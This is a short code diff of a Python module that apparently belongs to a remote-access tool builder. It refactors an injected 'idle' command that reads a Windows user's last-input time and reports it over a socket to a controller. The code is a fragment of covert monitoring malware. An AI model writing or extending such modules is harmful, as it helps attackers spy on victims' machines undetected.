@@ -1,10 +1,10 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
+
 
 def main(option):
     if option == 'generate':
@@ -21,7 +21,7 @@ def idle(data):
     lastInputInfo.cbSize = sizeof(lastInputInfo)
     windll.user32.GetLastInputInfo(byref(lastInputInfo))
     millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-    main_send('[+]User has been inactive for : ' + str(millis / 1000.0) + ' seconds', s)''')
+    send_all(s,'[+]User has been inactive for : ' + str(millis / 1000.0) + ' seconds')''')
         config.logics.append('''
             elif command == "idle":
                 idle(data)''')
